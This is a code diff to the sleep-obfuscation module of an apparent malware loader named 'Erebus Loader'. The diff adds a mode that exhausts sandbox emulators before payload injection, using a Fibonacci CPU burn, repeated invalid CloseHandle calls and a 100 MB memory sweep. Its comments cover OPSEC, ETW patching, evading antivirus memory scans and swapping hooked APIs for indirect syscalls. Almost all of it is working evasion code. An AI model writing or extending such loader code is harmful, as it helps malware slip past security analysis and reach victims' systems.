@@ -1,7 +1,7 @@
 /*
  * Erebus Loader - Sleep Obfuscation
  *
- * Provides a jittered, timer-based pre-injection dwell that defeats two
+ * Provides a jittered, timer-based pre-injection dwell that defeats several
  * common sandbox analysis techniques:
  *
  *   1. Sleep() / NtDelayExecution() acceleration - sandboxes commonly
@@ -16,6 +16,22 @@
  *      caller.  This hides static signatures from memory-resident AV
  *      products that scan working-set pages during sleep.
  *
+ *   3. Emulator / dynamic analysis exhaustion (mode 3) - combines three
+ *      computation-heavy techniques before the WaitableTimer wait:
+ *        a) Fibonacci burn: iterates ~500k Fibonacci steps through
+ *           intentionally branchy logic that is expensive for emulators
+ *           to simulate but trivial for real hardware.
+ *        b) API hammering: calls CloseHandle(INVALID_HANDLE_VALUE) 100k
+ *           times.  Emulators that model every system call pay ~100k
+ *           dispatch overheads; real kernels short-circuit the invalid
+ *           handle in a handful of cycles.
+ *        c) Memory consumption: allocates 100 MB in 4 KB page-touched
+ *           chunks to stress the emulator's virtual address space model,
+ *           then frees immediately before the timer wait.
+ *      The WaitableTimer wait then follows, so the total wall-clock dwell
+ *      is the computation time (variable, emulator-dependent) plus the
+ *      configured base/jitter period.
+ *
  * OPSEC Notes:
  *   - CreateWaitableTimerW is an import that appears in most GUI/service
  *     processes; it does not stand out in the loader's IAT.
@@ -23,6 +39,9 @@
  *     This generates NtProtectVirtualMemory ETW events.  If ETW is
  *     patched by RunEvasionPatches() (called before ObfuscatedDwell),
  *     these events are suppressed.
+ *   - Mode 3 memory allocation is done with VirtualAlloc PAGE_READWRITE
+ *     and freed before injection; it does not persist as a suspicious
+ *     RWX region.
  *   - [MALLEABLE] Replace VirtualProtect with an indirect syscall to
  *     NtProtectVirtualMemory if VirtualProtect is hooked in the target
  *     environment.
@@ -94,6 +113,57 @@ static void _DeriveXorKey(BYTE out[16])
 
 #endif // CONFIG_SLEEP_OBFUSCATION_TYPE == 2
 
+#if CONFIG_SLEEP_OBFUSCATION_TYPE == 3
+// ---------------------------------------------------------------------------
+// Emulator exhaustion helpers (mode 3 only)
+// ---------------------------------------------------------------------------
+
+// Fibonacci burn: iterate a Fibonacci sequence with intentionally
+// branch-heavy logic. Emulators pay per-instruction; hardware is fast.
+// Returns the final value to prevent the compiler from eliding the loop.
+static volatile ULONGLONG _FibonacciBurn(DWORD iterations)
+{
+    volatile ULONGLONG a = 0, b = 1;
+    for (DWORD i = 0; i < iterations; i++) {
+        ULONGLONG c = a + b;
+        a = b;
+        b = c;
+        // Conditional branch every iteration to prevent loop unrolling.
+        if (b == 0) b = 1;
+    }
+    return b;
+}
+
+// API hammering: call CloseHandle with an invalid handle repeatedly.
+// Real kernels reject the invalid handle in a few cycles; emulators
+// that model every NtClose dispatch pay a full emulation overhead
+// per call, making 100k iterations prohibitively slow for them.
+static void _HammerApi(DWORD count)
+{
+    for (DWORD i = 0; i < count; i++) {
+        CloseHandle((HANDLE)(ULONG_PTR)(i | 0xFFFFF000));
+    }
+}
+
+// Memory consumption: allocate and touch 100 MB in 4 KB pages.
+// Forces the emulator to model a large virtual address space delta.
+// Memory is freed immediately after touching so it does not persist.
+static void _ConsumeMemory(void)
+{
+    const SIZE_T total   = 100ULL * 1024 * 1024; // 100 MB
+    const SIZE_T page_sz = 4096;
+    BYTE* p = (BYTE*)VirtualAlloc(nullptr, total,
+                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!p) return;
+    // Touch each page to force emulator page-map bookkeeping.
+    for (SIZE_T off = 0; off < total; off += page_sz)
+        p[off] = (BYTE)(off & 0xFF);
+    SecureZeroMemory(p, total);
+    VirtualFree(p, 0, MEM_RELEASE);
+}
+
+#endif // CONFIG_SLEEP_OBFUSCATION_TYPE == 3
+
 // ---------------------------------------------------------------------------
 // Public API
 // ---------------------------------------------------------------------------
@@ -108,6 +178,52 @@ BOOL ObfuscatedDwell(ULONG base_ms, ULONG jitter_ms)
     (void)base_ms;
     (void)jitter_ms;
     return TRUE;
+
+#elif CONFIG_SLEEP_OBFUSCATION_TYPE == 3
+
+    // ---- Emulator exhaustion before the timer wait -------------------------
+    // Run all three exhaustion techniques up front. On real hardware these
+    // complete in under a second; an emulator serialising every instruction
+    // and system call may spend minutes here, at which point sandbox timeout
+    // fires and no behaviour is recorded.
+    (void)_FibonacciBurn(500000);
+    _HammerApi(100000);
+    _ConsumeMemory();
+
+    // Fall through to the WaitableTimer wait below.
+    {
+    ULONG actual_ms = base_ms;
+    if (jitter_ms > 0)
+    {
+        LARGE_INTEGER pc = {};
+        QueryPerformanceCounter(&pc);
+        actual_ms += (ULONG)((ULONGLONG)pc.QuadPart % ((ULONGLONG)jitter_ms + 1));
+    }
+    if (actual_ms == 0) return TRUE;
+
+    HANDLE hTimer = CreateWaitableTimerW(nullptr, TRUE, nullptr);
+    if (!hTimer)
+    {
+        LARGE_INTEGER interval;
+        interval.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);
+        typedef NTSTATUS(NTAPI* _NtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
+        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+        if (hNtdll)
+        {
+            auto NtDelayExecution = reinterpret_cast<_NtDelayExecution>(
+                GetProcAddress(hNtdll, "NtDelayExecution"));
+            if (NtDelayExecution)
+                NtDelayExecution(FALSE, &interval);
+        }
+        return FALSE;
+    }
+    LARGE_INTEGER due;
+    due.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);
+    SetWaitableTimer(hTimer, &due, 0, nullptr, nullptr, FALSE);
+    WaitForSingleObject(hTimer, INFINITE);
+    CloseHandle(hTimer);
+    return TRUE;
+    }
 
 #else // MODE 1 or 2
 
